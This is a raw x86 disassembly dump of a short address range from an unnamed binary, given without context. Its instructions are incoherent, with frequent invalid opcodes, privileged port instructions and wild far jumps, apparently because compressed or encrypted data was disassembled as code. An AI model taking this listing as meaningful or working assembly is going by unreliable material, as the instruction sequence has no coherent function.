  40f6e7:	lods   al,BYTE PTR ds:[esi]
  40f6e8:	sbb    bh,bh
  40f6ea:	mov    ah,0xa4
  40f6ec:	inc    edi
  40f6ed:	mov    bh,0x64
  40f6ef:	push   esp
  40f6f0:	pushf  
  40f6f1:	xor    al,BYTE PTR [edx]
  40f6f3:	jl     0x40f691
  40f6f5:	(bad)  
  40f6f6:	pop    eax
  40f6f7:	sbb    eax,0xc9990cb3
  40f6fc:	mov    WORD PTR [esi+eiz*1+0x209e764d],fs
  40f703:	dec    ebx
  40f704:	cld    
  40f705:	jne    0x40f6e2
  40f707:	adc    ebx,DWORD PTR [ebx+eiz*8+0xe]
  40f70b:	or     al,0x1a
  40f70d:	inc    edi
  40f70e:	lods   al,BYTE PTR ds:[esi]
  40f70f:	popa   
  40f710:	xor    BYTE PTR [ebx-0x3c],dh
  40f713:	xchg   edx,eax
  40f714:	xor    DWORD PTR [ecx],ecx
  40f716:	in     al,0x47
  40f718:	fwait
  40f719:	sti    
  40f71a:	out    dx,eax
  40f71b:	popf   
  40f71c:	mov    edx,0x63552d4c
  40f721:	(bad)  [esi-0x6e]
  40f724:	push   edi
  40f725:	sub    edi,DWORD PTR [ebx+0x3e]
  40f728:	test   al,0xc7
  40f72a:	pusha  
  40f72b:	mov    al,ds:0x520a3b7b
  40f730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f731:	stos   BYTE PTR es:[edi],al
  40f732:	shl    dl,cl
  40f734:	jns    0x40f765
  40f736:	or     eax,0xee6da8c8
  40f73b:	not    DWORD PTR [edx]
  40f73d:	add    eax,0x52f57145
  40f742:	stos   DWORD PTR es:[edi],eax
  40f743:	js     0x40f716
  40f745:	ins    DWORD PTR es:[edi],dx
  40f746:	dec    ecx
  40f747:	sub    ebp,ecx
  40f749:	lods   al,BYTE PTR ds:[esi]
  40f74a:	rcr    BYTE PTR [ebp-0x47],cl
  40f74d:	jb     0x40f74a
  40f74f:	pop    DWORD PTR [ecx]
  40f751:	push   ebx
  40f752:	dec    eax
  40f753:	pop    esi
  40f754:	(bad)  
  40f755:	xor    DWORD PTR [esi+0x7d],ecx
  40f758:	pushf  
  40f759:	lahf   
  40f75a:	inc    ebp
  40f75b:	pop    es
  40f75c:	std    
  40f75d:	lods   eax,DWORD PTR gs:[esi]
  40f75f:	cmp    ch,BYTE PTR [ebx]
  40f761:	push   eax
  40f762:	enter  0xe088,0x6a
  40f766:	dec    esp
  40f767:	mov    gs,WORD PTR [esi+esi*1]
  40f76a:	(bad)  
  40f76c:	dec    edi
  40f76d:	iret   
  40f76e:	and    BYTE PTR [eax+0x5c4b5320],ch
  40f774:	mov    al,ds:0xe2bc6109
  40f779:	pop    ebp
  40f77a:	lock lea edx,[edi-0x70a34d05]
  40f781:	aad    0x90
  40f783:	pop    esi
  40f784:	or     BYTE PTR [ecx],0xc0
  40f787:	jae    0x40f73b
  40f789:	dec    ebp
  40f78a:	mov    cl,0x77
  40f78c:	xchg   edx,eax
  40f78d:	dec    edx
  40f78e:	and    dh,BYTE PTR [edi-0x331896f5]
  40f794:	mov    eax,ds:0xdddd9755
  40f799:	pop    edi
  40f79a:	push   0x3e4780b4
  40f79f:	int    0x6e
  40f7a1:	sub    ebx,esp
  40f7a3:	cdq    
  40f7a4:	icebp  
  40f7a5:	add    bh,0xfe
  40f7a8:	pop    es
  40f7a9:	jmp    0x89559e64
  40f7ae:	das    
  40f7af:	addr16 sbb al,0xc3
  40f7b2:	dec    dx
  40f7b4:	sti    
  40f7b5:	jb     0x40f7d5
  40f7b7:	test   eax,0x4e3a4325
  40f7bc:	aas    
  40f7bd:	add    eax,0x5789ef6f
  40f7c2:	mov    ds:0xcd0c5e12,al
  40f7c7:	icebp  
  40f7c8:	int    0x4c
  40f7ca:	push   cs
  40f7cb:	mov    bl,0x41
  40f7cd:	scas   al,BYTE PTR es:[edi]
  40f7ce:	cmp    eax,0x86abfaa0
  40f7d3:	ror    ebp,0x34
  40f7d6:	cld    
  40f7d7:	and    esp,0x9a2c7b5c
  40f7dd:	cmp    dh,BYTE PTR [eax-0x8]
  40f7e0:	xchg   esp,eax
  40f7e1:	shr    DWORD PTR [esi-0x5c],1
  40f7e4:	mov    ds:0x3be4eea4,al
  40f7e9:	pop    edi
  40f7ea:	aad    0xf9
  40f7ec:	and    BYTE PTR [ebp+0x3c39e621],bh
  40f7f2:	sub    DWORD PTR [edx],0x82cd9c12
  40f7f8:	aas    
  40f7f9:	jns    0x40f7fb
  40f7fb:	sub    DWORD PTR [ebx],edx
  40f7fd:	jno    0x40f813
  40f7ff:	cmp    eax,0x31a3788b
  40f804:	xchg   esp,eax
  40f805:	or     DWORD PTR [ebp+0xd],edi
  40f808:	retf   0xf940
  40f80b:	xchg   ebx,eax
  40f80c:	mov    bh,0x3e
  40f80e:	and    eax,0x6c8cf92d
  40f813:	mov    eax,0x5bcdd89d
  40f818:	add    bl,BYTE PTR [esi-0xc243b24]
  40f81e:	mov    ch,ch
  40f820:	enter  0xdb8c,0xd0
  40f824:	sub    eax,DWORD PTR [ebx]
  40f826:	add    ebx,DWORD PTR [edi+ebx*1+0x72]
  40f82a:	jo     0x40f7e3
  40f82c:	cmp    cl,bl
  40f82e:	inc    ecx
  40f82f:	push   esi
  40f830:	mov    ecx,0x92c73d96
  40f835:	and    eax,0x3fb7d795
  40f83a:	mov    bh,BYTE PTR [ebx+ecx*1]
  40f83d:	test   BYTE PTR [ebp-0x58],0x15
  40f841:	jp     0x40f854
  40f843:	aad    0x3a
  40f845:	cwde   
  40f846:	scas   al,BYTE PTR es:[edi]
  40f847:	lahf   
  40f848:	adc    BYTE PTR [edx-0x42],dh
  40f84b:	fadd   QWORD PTR [ecx-0x9a3428f]
  40f851:	sbb    al,BYTE PTR [ecx+0xa]
  40f854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f855:	xor    dl,BYTE PTR [esi+0x257bbbe4]
  40f85b:	inc    ebp
  40f85c:	nop
  40f85d:	sub    ebx,esp
  40f85f:	jmp    0x40f839
  40f861:	js     0x40f8ce
  40f863:	call   0xf7d:0x18fbe8b
  40f86a:	jae    0x40f879
  40f86c:	sbb    cl,BYTE PTR [ebx-0x26]
  40f86f:	fdiv   DWORD PTR [eax-0xf]
  40f872:	or     eax,0x80e16273
  40f877:	sub    al,0x68
  40f879:	ret    
  40f87a:	lods   eax,DWORD PTR ds:[esi]
  40f87b:	rcr    DWORD PTR [edx+0x35],cl
  40f87e:	lahf   
  40f87f:	inc    ebx
  40f880:	xchg   esp,eax
  40f881:	mov    ebp,0x537df47
  40f886:	jae    0x40f84c
  40f888:	and    DWORD PTR [esi-0x451fca22],edx
  40f88e:	pop    edi
  40f88f:	mov    ebx,0x4986aa2c
  40f894:	(bad)  
  40f896:	clc    
  40f897:	lds    ecx,FWORD PTR [ebp-0x34]
  40f89a:	test   eax,0x679d9a8f
  40f89f:	rcr    DWORD PTR [ebx-0x74],1
  40f8a2:	xchg   esi,eax
  40f8a3:	inc    edx
  40f8a4:	cwde   
  40f8a5:	dec    ebx
  40f8a6:	enter  0xc4fc,0x5d
  40f8aa:	sbb    BYTE PTR [edi-0x18b74820],cl
  40f8b0:	and    ch,bh
  40f8b2:	xchg   ebp,eax
  40f8b3:	dec    esi
  40f8b4:	es popf 
  40f8b6:	bound  edx,QWORD PTR [ebx-0x3c62807]
  40f8bc:	nop
  40f8bd:	retf   
  40f8be:	mov    edi,0xe05c81d8
  40f8c3:	and    dl,BYTE PTR [ecx+0x4dde54c]
  40f8c9:	dec    ebp
  40f8ca:	cmp    esp,ebp
  40f8cc:	dec    edi
  40f8cd:	pop    ds
  40f8ce:	pop    eax
  40f8cf:	pop    eax
  40f8d0:	jne    0x40f8d8
  40f8d2:	push   edx
  40f8d3:	repnz inc ecx
  40f8d5:	loop   0x40f8ab
  40f8d7:	shl    BYTE PTR [ecx+0x2c],0x54
  40f8db:	into   
  40f8dc:	int3   
  40f8dd:	push   ecx
  40f8de:	dec    esp
  40f8df:	jmp    0x40f91d
  40f8e1:	push   ebp
  40f8e2:	lock add DWORD PTR [eax],ebx
  40f8e5:	ja     0x40f962
  40f8e7:	retf   0x828a
  40f8ea:	sub    dh,BYTE PTR [edx]
  40f8ec:	aad    0xdf
  40f8ee:	fistp  WORD PTR [ecx+0x2a]
  40f8f1:	dec    BYTE PTR [esi+0x14]
  40f8f4:	pop    ss
  40f8f5:	cmp    esp,DWORD PTR [esi-0xa5871cc]
  40f8fb:	sbb    al,0xa9
  40f8fd:	mov    dl,0x76
  40f8ff:	inc    ebp
  40f900:	rcr    DWORD PTR [ecx*2-0x27420eab],0xb2
  40f908:	fwait
  40f909:	pushf  
  40f90a:	data16 fiadd DWORD PTR [edi-0x2c]
  40f90e:	loopne 0x40f8cd
  40f910:	addr16 aas 
  40f912:	stc    
  40f913:	lods   eax,DWORD PTR ds:[esi]
  40f914:	or     bl,dl
  40f916:	in     eax,dx
  40f917:	mov    DWORD PTR [ebp+0x13],esi
  40f91a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f91b:	fld    QWORD PTR [ebx]
  40f91d:	inc    edx
  40f91e:	pop    esi
  40f91f:	nop
  40f920:	sbb    ebx,DWORD PTR [esi-0x6d7333b9]
  40f926:	pushf  
  40f927:	lods   eax,DWORD PTR ds:[esi]
  40f928:	jns    0x40f8fe
  40f92a:	test   bl,dl
  40f92c:	arpl   WORD PTR [ecx],sp
  40f92e:	call   0x69b3f5a2
  40f933:	in     eax,dx
  40f934:	sub    DWORD PTR [ebp-0x7b],edi
  40f937:	stc    
  40f938:	add    al,0x1c
  40f93a:	imul   ebx,DWORD PTR [eax+ecx*2+0x52],0x3b
  40f93f:	cdq    
  40f940:	xlat   BYTE PTR ds:[ebx]
  40f941:	xchg   ecx,eax
  40f942:	dec    ecx
  40f943:	add    cl,BYTE PTR [edi]
  40f945:	mov    dh,0xc2
  40f947:	ja     0x40f8d0
  40f949:	ins    DWORD PTR es:[edi],dx
  40f94a:	rcr    al,0xd8
  40f94d:	cmp    eax,0x3c076a73
  40f952:	daa    
  40f953:	test   DWORD PTR [eax+0x20e42141],ebx
  40f959:	pop    esp
  40f95a:	fs mov ch,0x7d
  40f95d:	adc    al,0xa7
  40f95f:	or     al,0xfb
  40f961:	inc    esp
  40f962:	fimul  DWORD PTR [ecx]
  40f964:	add    BYTE PTR [eax-0x72],ah
  40f967:	lock retf 0x9cd8
  40f96b:	test   eax,0x172b9a65
  40f970:	mov    ch,0xdd
  40f972:	add    BYTE PTR [edx],bh
  40f974:	mov    ecx,0xd4a54680
  40f979:	push   ebp
  40f97a:	lods   eax,DWORD PTR ds:[esi]
  40f97b:	imul   edi,DWORD PTR [ebp-0x1a],0xfffffff1
  40f97f:	scas   al,BYTE PTR es:[edi]
  40f980:	adc    bh,BYTE PTR [edi]
  40f982:	std    
  40f983:	inc    ebx
  40f984:	pop    edi
  40f985:	fcomp  QWORD PTR [ebx+0x62]
  40f988:	or     ebx,DWORD PTR [esi]
  40f98a:	test   eax,0x257ce564
  40f98f:	and    esi,DWORD PTR [edi+0x13]
  40f992:	fidiv  DWORD PTR ds:0xebae9182
  40f998:	pop    es
  40f999:	scas   eax,DWORD PTR es:[edi]
  40f99a:	fwait
  40f99b:	push   eax
  40f99c:	mov    ah,0x4f
  40f99e:	or     edi,DWORD PTR [ecx-0x167bff86]
  40f9a4:	leave  
  40f9a5:	enter  0x9c1d,0x2
  40f9a9:	jae    0x40fa10
  40f9ab:	inc    edi
  40f9ac:	add    eax,0x246728ab
  40f9b1:	stc    
  40f9b2:	xlat   BYTE PTR ds:[ebx]
  40f9b3:	inc    esi
  40f9b4:	push   ecx
  40f9b5:	dec    ecx
  40f9b6:	pop    ds
  40f9b7:	int    0xff
  40f9b9:	sbb    al,0x7d
  40f9bb:	mov    al,ds:0x1d40a74a
  40f9c0:	mov    al,0x61
  40f9c2:	outs   dx,BYTE PTR ds:[esi]
  40f9c3:	jnp    0x40f955
  40f9c5:	call   0x6ca9:0xedeb9f4c
  40f9cc:	or     eax,0x412a626f
  40f9d1:	rcl    DWORD PTR [ecx+0x7daa4553],0xbe
  40f9d8:	sub    DWORD PTR [ebx+eiz*1-0x3e0f0da9],esp
  40f9df:	fcmovb st,st(1)
  40f9e1:	push   edx
  40f9e2:	outs   dx,DWORD PTR ds:[esi]
  40f9e3:	aam    0xc6
  40f9e5:	enter  0x8d78,0xb7
  40f9e9:	pop    edi
  40f9ea:	data16 jg 0x40f97a
  40f9ed:	shr    BYTE PTR [ebx-0x2e],cl
  40f9f0:	pop    ebx
  40f9f1:	sbb    ch,BYTE PTR [ecx+ecx*1-0x42]
  40f9f5:	pop    es
  40f9f6:	test   eax,0x22d0b70
  40f9fb:	adc    ah,dl
  40f9fd:	fwait
  40f9fe:	shr    BYTE PTR [ebp+0x53544137],cl
  40fa04:	add    BYTE PTR [ecx-0x5],cl
  40fa07:	ds xchg ebp,eax
  40fa09:	inc    edx
  40fa0a:	push   es
  40fa0b:	push   ss
  40fa0c:	dec    esi
  40fa0d:	pop    edi
  40fa0e:	fidiv  DWORD PTR [edi+0x10]
  40fa11:	imul   esp,DWORD PTR [esp+eax*4-0x7f],0xffffffda
  40fa16:	data16 sti 
  40fa18:	cmp    esp,ecx
  40fa1a:	mov    ebx,0xf974c857
  40fa1f:	lods   eax,DWORD PTR ds:[esi]
  40fa20:	push   ds
  40fa21:	adc    al,0x84
  40fa23:	xchg   ecx,eax
  40fa24:	mov    al,0x9a
  40fa26:	xchg   esi,eax
  40fa27:	sub    al,0x6b
  40fa29:	lock or ecx,DWORD PTR ds:0xcc122cd0
  40fa30:	inc    ecx
  40fa31:	sbb    al,0x2d
  40fa33:	add    ecx,DWORD PTR [ecx+0x5b]
  40fa36:	ror    BYTE PTR [esp+ebx*2],cl
  40fa39:	aam    0xe0
  40fa3b:	mov    esi,0x8eaa2972
  40fa40:	lahf   
  40fa41:	or     eax,0x7d86ac5f
  40fa46:	ud1    ecx,DWORD PTR [eax]
  40fa49:	cmp    BYTE PTR [esi],bh
  40fa4b:	dec    esp
  40fa4c:	push   0xa
  40fa4e:	push   0x6d37f0d
  40fa53:	shr    DWORD PTR [ebp-0x30d429c0],1
  40fa59:	add    BYTE PTR [edx],0xd
  40fa5c:	das    
  40fa5d:	and    eax,0x788731c5
  40fa62:	fdiv   QWORD PTR [edx+0x7df7b3df]
  40fa68:	loope  0x40fa88
  40fa6a:	pop    ebp
  40fa6b:	inc    BYTE PTR ds:0x8aabc483
  40fa72:	lea    esi,[eax]
  40fa74:	shl    BYTE PTR [ecx-0x2b],cl
  40fa77:	mov    bh,0x6
  40fa79:	xlat   BYTE PTR ds:[ebx]
  40fa7a:	adc    eax,0x6332ede0
  40fa7f:	xchg   ebp,eax
  40fa80:	cdq    
  40fa81:	cld    
  40fa82:	sahf   
  40fa83:	mov    eax,0x6c95d68e
  40fa88:	add    al,0x56
  40fa8a:	stos   BYTE PTR es:[edi],al
  40fa8b:	adc    eax,0xde7f8311
  40fa90:	ret    0x1e8
  40fa93:	push   eax
  40fa94:	shr    esp,1
  40fa96:	xchg   al,ah
  40fa98:	fsub   DWORD PTR [esi+0x73cbd301]
  40fa9e:	xor    dl,BYTE PTR [ebp-0x6d873985]
  40faa4:	jl     0x40fa2d
  40faa6:	icebp  
  40faa7:	mov    cl,0x85
  40faa9:	dec    edi
  40faaa:	jbe    0x40faff
  40faac:	pop    edx
  40faad:	mov    dl,0xfb
  40faaf:	ja     0x40fb11
  40fab1:	sub    DWORD PTR [eax+0x9],esp
  40fab4:	inc    BYTE PTR [ebx+edi*8-0x4c]
  40fab8:	add    BYTE PTR [eax+ecx*2-0x2403bc31],bh
  40fabf:	faddp  st(0),st
  40fac1:	push   ss
  40fac2:	cmp    dl,BYTE PTR [edi]
  40fac4:	add    al,0x49
  40fac6:	popa   
  40fac7:	push   esi
  40fac8:	test   al,0xaf
  40faca:	in     eax,0x76
  40facc:	or     al,0xfa
  40face:	in     eax,0xd
  40fad0:	ret    0xed1d
  40fad3:	and    eax,0xd69c739b
  40fad8:	push   es
  40fad9:	sahf   
  40fada:	mov    dh,0x94
  40fadc:	mov    ah,0xa2
  40fade:	pushf  
  40fadf:	lea    ebp,[edx+0x1755f18d]
  40fae5:	data16 fucomip st,st(2)
  40fae8:	cld    
  40fae9:	rcl    DWORD PTR [esi],0xe4
  40faec:	iret   
  40faed:	pop    es
  40faee:	xor    edi,edx
  40faf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faf1:	loope  0x40fb43
  40faf3:	pop    ss
  40faf4:	stos   BYTE PTR es:[edi],al
  40faf5:	not    BYTE PTR [edx]
  40faf7:	fcomp  QWORD PTR [edx-0x40013e13]
  40fafd:	(bad)  
  40fafe:	sbb    esp,DWORD PTR [edx+0x3f]
  40fb01:	add    ecx,DWORD PTR [esi+0x22b4d5bc]
  40fb07:	and    dl,BYTE PTR [ecx]
  40fb09:	retf   0xbab5
  40fb0c:	aad    0xaf
  40fb0e:	cmp    DWORD PTR [ebp-0x4e],ebx
  40fb11:	and    BYTE PTR [edx+ebp*1+0x42],0xeb
  40fb16:	pushf  
  40fb17:	fldcw  WORD PTR [edi-0x5e]
  40fb1a:	sub    ebx,DWORD PTR [esi-0x72]
  40fb1d:	fbstp  TBYTE PTR [eax]
  40fb1f:	jae    0x40fad5
  40fb21:	xchg   esi,eax
  40fb22:	dec    ebp
  40fb23:	lock push cs
  40fb25:	jl     0x40fb10
  40fb27:	in     al,0x5f
  40fb29:	loopne 0x40fb31
  40fb2b:	call   0xcaf8:0xce4ebdc3
  40fb32:	mov    ebp,0x442c2300
  40fb37:	mov    esp,0x6ea924c2
  40fb3c:	and    dl,0x6a
  40fb3f:	and    DWORD PTR [esi],0x7a8a2b1c
  40fb45:	push   ss
  40fb46:	retf   
  40fb47:	sbb    edi,DWORD PTR [ebx]
  40fb49:	xchg   DWORD PTR [ebx+esi*1-0x4],esi
  40fb4d:	rcl    BYTE PTR [esi+0x564600bc],0x28
  40fb54:	nop
  40fb55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb56:	cmp    al,0x7d
  40fb58:	xchg   dl,bh
  40fb5a:	aaa    
  40fb5b:	xor    eax,0x12384d4d
  40fb60:	and    BYTE PTR [ebp-0x7dd63c95],ch
  40fb66:	pop    esi
  40fb67:	fst    DWORD PTR [esi-0x1d]
  40fb6a:	cs adc eax,0x2b642243
  40fb70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb71:	cmp    dh,0xb1
  40fb74:	(bad)  
  40fb75:	inc    ecx
  40fb76:	fdiv   DWORD PTR [ebx]
  40fb78:	or     ebx,ebp
  40fb7a:	xor    eax,0x866b258c
  40fb7f:	adc    eax,0xf1454e4b
  40fb84:	das    
  40fb85:	loopne 0x40fbe4
  40fb87:	dec    edx
  40fb88:	inc    ebx
  40fb89:	adc    BYTE PTR [ebp+esi*2-0x40],0x60
  40fb8e:	jmp    FWORD PTR [ecx]
  40fb90:	mov    al,BYTE PTR [edi+0xa8561d7]
  40fb96:	dec    edx
  40fb97:	add    al,0xa5
  40fb99:	pushf  
  40fb9a:	jecxz  0x40fb8e
  40fb9c:	xor    BYTE PTR [ebp+0x47eda4ae],bh
  40fba2:	jmp    0x40fba3
  40fba4:	int3   
  40fba5:	stc    
  40fba6:	loop   0x40fb94
  40fba8:	jb     0x40fb64
  40fbaa:	xor    eax,0x403a5157
  40fbaf:	or     eax,0x119cb26
  40fbb4:	adc    esp,DWORD PTR [edi]
  40fbb6:	push   edi
  40fbb8:	arpl   WORD PTR [esi+0x68],si
  40fbbb:	pop    ss
  40fbbc:	mov    dh,0xfb
  40fbbe:	fimul  DWORD PTR [eax]
  40fbc0:	out    0x74,al
  40fbc2:	mov    edi,DWORD PTR [ecx]
  40fbc4:	jne    0x40fbf6
  40fbc6:	mov    ch,0x5f
  40fbc8:	sub    al,0x38
  40fbca:	mov    ds:0x50bdb4be,al
  40fbcf:	arpl   WORD PTR [ebp+0x76],bx
  40fbd2:	gs xor ecx,0x9d4372ed
  40fbd9:	jg     0x40fbc0
  40fbdb:	lahf   
  40fbdc:	pop    eax
  40fbdd:	pop    esi
  40fbde:	push   edx
  40fbdf:	in     al,0x71
  40fbe1:	aas    
  40fbe2:	jg     0x40fbc9
  40fbe4:	jmp    0x477aea7d
  40fbe9:	push   ds
  40fbea:	test   dh,al
  40fbec:	scas   eax,DWORD PTR es:[edi]
  40fbed:	mov    edx,0xc6560c25
  40fbf2:	dec    edi
  40fbf3:	outs   dx,BYTE PTR ds:[esi]
  40fbf4:	adc    esp,edi
  40fbf6:	pop    ds
  40fbf7:	cli    
  40fbf8:	ror    ecx,cl
  40fbfa:	dec    ebp
  40fbfb:	into   
  40fbfc:	and    al,ah
  40fbfe:	push   ebx
  40fbff:	data16 shl dl,0x66
  40fc03:	pushf  
  40fc04:	dec    edx
  40fc05:	imul   ebx,DWORD PTR es:[ecx],0xffffffab
  40fc09:	sub    al,0x67
  40fc0b:	cmc    
  40fc0c:	add    al,0xb1
  40fc0e:	outs   dx,DWORD PTR ds:[esi]
  40fc0f:	xchg   esi,eax
  40fc10:	adc    cl,BYTE PTR [esi+0x54]
  40fc13:	mov    ebx,0x32b2ed82
  40fc18:	push   DWORD PTR [ebx-0x6d]
  40fc1b:	psubsw mm2,mm0
  40fc1e:	ret    0xb141
  40fc21:	jo     0x40fc96
  40fc23:	and    al,BYTE PTR [esi-0x53fe9e9a]
  40fc29:	sbb    eax,0x590ab2a
  40fc2e:	ds xor eax,edi
  40fc31:	out    dx,eax
  40fc32:	(bad)  
  40fc33:	sub    esp,DWORD PTR ds:[eax+0x57ee3b23]
  40fc3a:	sub    al,0x7b
  40fc3c:	mov    BYTE PTR [ebp+0xc621ad5],dl
  40fc42:	(bad)  
  40fc44:	mov    edi,0xb51fbc5f
  40fc49:	fdiv   st(7),st
  40fc4b:	outs   dx,BYTE PTR ds:[esi]
  40fc4c:	pusha  
  40fc4d:	(bad)  
  40fc4e:	aad    0xb8
  40fc50:	mov    BYTE PTR [edx],ch
  40fc52:	imul   edx,ecx,0x2a
  40fc55:	aaa    
  40fc56:	lds    edx,FWORD PTR [edi]
  40fc58:	push   cs
  40fc59:	inc    edi
  40fc5a:	fcom   QWORD PTR [edx+0x34a58ccf]
  40fc60:	add    ebp,DWORD PTR [edx+edi*4+0x69b62527]
  40fc67:	out    dx,eax
  40fc68:	cld    
  40fc69:	sbb    eax,0xa4493a38
  40fc6e:	xchg   edi,eax
  40fc6f:	repnz add eax,0xd4d37aa5
  40fc75:	test   al,0xf3
  40fc77:	add    al,BYTE PTR [ebp-0x5]
  40fc7a:	xchg   esi,eax
  40fc7b:	add    al,0xe0
  40fc7d:	(bad)  
  40fc7e:	mov    ebp,DWORD PTR [edi-0x11]
  40fc81:	xchg   ecx,eax
  40fc82:	add    al,0x6c
  40fc84:	pop    ss
  40fc85:	dec    ebx
  40fc86:	shl    edi,0x3e
  40fc89:	or     DWORD PTR [ebp+0x75e6bd10],ebp
  40fc8f:	das    
  40fc90:	or     BYTE PTR [eax-0x4e],0xb7
  40fc94:	sub    BYTE PTR [edi+esi*4],0x5e
  40fc98:	add    ebp,DWORD PTR [esi+0x57]
  40fc9b:	cmp    ebp,DWORD PTR [ebp+0x1a1f02f2]
  40fca1:	mov    al,0x71
  40fca3:	hlt    
  40fca4:	fucomi st,st(0)
  40fca6:	scas   al,BYTE PTR es:[edi]
  40fca7:	scas   eax,DWORD PTR es:[edi]
  40fca8:	loope  0x40fd15
  40fcaa:	jle    0x40fca4
  40fcac:	(bad)  
  40fcae:	mov    ebx,0x9bbb12a6
  40fcb3:	push   edi
  40fcb4:	sahf   
  40fcb5:	and    ch,BYTE PTR [ecx-0xd0bfab0]
  40fcbb:	xor    BYTE PTR [edi-0x55a3a5b1],dl
  40fcc1:	push   eax
  40fcc2:	push   esi
  40fcc3:	(bad)  
  40fcc4:	test   al,0x30
  40fcc6:	xchg   edx,eax
  40fcc7:	fcom   DWORD PTR [ebp-0x5f]
  40fcca:	fistp  WORD PTR [esi+0x41]
  40fccd:	sub    ecx,DWORD PTR [edi+0x6f]
  40fcd0:	jae    0x40fc70
  40fcd2:	ret    
  40fcd3:	(bad)  
  40fcd4:	jmp    0x40fceb
  40fcd6:	sbb    DWORD PTR [ebx-0x6c95aebb],ecx
  40fcdc:	inc    esi
  40fcdd:	retf   0x36fe
  40fce0:	rcr    ah,0x0
  40fce3:	add    dl,BYTE PTR [edx+eax*8]
  40fce6:	test   al,0xeb
  40fce8:	les    esp,FWORD PTR [ebx+0x6f]
  40fceb:	movaps XMMWORD PTR [ebx+0x19],xmm4
  40fcef:	mov    cl,al
  40fcf1:	xor    DWORD PTR [ebx],esp
  40fcf3:	jb     0x40fd03
  40fcf5:	xchg   DWORD PTR [esi+0x2a],edx
  40fcf8:	sar    DWORD PTR [edx-0x6b8f8d06],cl
  40fcfe:	dec    esi
  40fcff:	mov    al,BYTE PTR [esp+eiz*8-0x1c]
  40fd03:	mov    edx,0xfceab324
  40fd08:	out    0x1a,al
  40fd0a:	fdivr  QWORD PTR [eax-0x1f804565]
  40fd10:	or     DWORD PTR [eax+0x28],edx
  40fd13:	imul   edx,DWORD PTR [esi],0xe
  40fd16:	mov    ebp,0xd1940bb5
  40fd1b:	push   cs
  40fd1c:	dec    ebx
  40fd1d:	jmp    0xfb56dbc4
  40fd22:	cmp    al,0x1
  40fd24:	sbb    al,0xa4
  40fd26:	cmp    al,0x6
  40fd28:	sub    al,BYTE PTR [ebp-0x27aab2f5]
  40fd2e:	and    ebx,DWORD PTR [ebx+eiz*1-0xf]
  40fd32:	inc    ebx
  40fd33:	pop    ecx
  40fd34:	mov    ds:0x4514d055,al
  40fd39:	ror    BYTE PTR [ecx],0xc2
  40fd3c:	mov    ch,0xc0
  40fd3e:	leave  
  40fd3f:	inc    ebx
  40fd40:	sbb    ebp,edx
  40fd42:	push   es
  40fd43:	or     esi,ebp
  40fd45:	cld    
  40fd46:	in     al,0x37
  40fd48:	push   eax
  40fd49:	push   ss
  40fd4a:	loop   0x40fd8e
  40fd4c:	leave  
  40fd4d:	scas   eax,DWORD PTR es:[edi]
  40fd4e:	hlt    
  40fd4f:	dec    edi
  40fd50:	jecxz  0x40fcd6
  40fd52:	sbb    DWORD PTR [ebp-0x6eaa0edb],edi
  40fd58:	add    esp,DWORD PTR [ecx-0x63]
  40fd5b:	mov    esp,0x84852824
  40fd60:	mov    edi,DWORD PTR [esi]
  40fd62:	or     eax,0xe1eda12c
  40fd67:	sub    al,0x7d
  40fd69:	xchg   DWORD PTR [ebx],eax
  40fd6b:	sub    ebp,edi
  40fd6d:	bound  ebx,QWORD PTR [edx]
  40fd6f:	(bad)  
  40fd70:	push   0x5631d882
  40fd75:	leave  
  40fd76:	fcmovnb st,st(6)
  40fd78:	xchg   ebp,eax
  40fd79:	call   0x63a3:0xa3a1b082
  40fd80:	jge    0x40fd6d
  40fd82:	daa    
  40fd83:	test   BYTE PTR [edi-0x25dc1821],cl
  40fd89:	imul   edx,DWORD PTR [edx+0x63b19d21],0xffffffba
  40fd90:	mov    eax,ds:0x368bc767
  40fd95:	cmp    BYTE PTR [eax-0x40c65e4f],dl
  40fd9b:	pop    esp
  40fd9c:	mov    ds:0x400d34e7,al
  40fda1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fda2:	mov    DWORD PTR [ebx-0x3],ecx
  40fda5:	loope  0x40fdd4
  40fda7:	call   0xea21de92
  40fdac:	or     ecx,DWORD PTR [edi+0x74338028]
  40fdb2:	pop    ebp
  40fdb3:	pop    esi
  40fdb4:	loop   0x40fe10
  40fdb6:	xchg   al,bl
  40fdb8:	retf   0x38b4
  40fdbb:	pop    esp
  40fdbc:	mov    esp,0xc14b7215
  40fdc1:	sub    BYTE PTR [di-0x68],dh
  40fdc5:	sub    eax,0xa424fd07
  40fdca:	mov    esp,DWORD PTR [edx]
  40fdcc:	stos   BYTE PTR es:[edi],al
  40fdcd:	mov    ebp,0x6c7277
  40fdd2:	xchg   esp,eax
  40fdd3:	shl    DWORD PTR [edi+0x28],cl
  40fdd6:	adc    DWORD PTR [ebx+0x3e],ecx
  40fdd9:	mov    bh,0x4e
  40fddb:	(bad)  
  40fddd:	fdivr  DWORD PTR [edx-0x2412ae92]
  40fde3:	jmp    0xb5840b9c
  40fde8:	mov    edx,0x68f682f1
  40fded:	test   ebx,0xc8a8cd34
  40fdf3:	and    bh,dh
  40fdf5:	jle    0x40fda8
  40fdf7:	jmp    0x40fde9
  40fdf9:	add    BYTE PTR gs:[esi-0x17],0xad
  40fdfe:	pop    ecx
  40fdff:	jmp    0x6f408a9e
  40fe04:	add    BYTE PTR [ebp-0x7bec896e],al
  40fe0a:	add    esi,edi
  40fe0c:	sub    ebp,esp
  40fe0e:	jmp    0xc48f:0xb0d7ca43
  40fe15:	jmp    FWORD PTR [edi]
  40fe17:	dec    eax
  40fe18:	mov    ds:0x82c23ed,al
  40fe1d:	popa   
  40fe1e:	or     edi,edx
  40fe20:	push   edx
  40fe21:	cmp    cl,cl
  40fe23:	and    esi,esi
  40fe25:	fild   DWORD PTR [edx+0x671fda78]
  40fe2b:	sub    DWORD PTR [eax],edx
  40fe2d:	test   eax,0x361c7420
  40fe32:	inc    esp
  40fe33:	neg    DWORD PTR [edx]
  40fe35:	or     DWORD PTR [edi-0x7187626c],eax
  40fe3b:	retf   
  40fe3c:	and    al,cl
  40fe3e:	mov    esi,0x4edbc3b5
  40fe43:	and    al,0x49
  40fe45:	mov    BYTE PTR [edi-0x37f9cdaa],dh
  40fe4b:	fwait
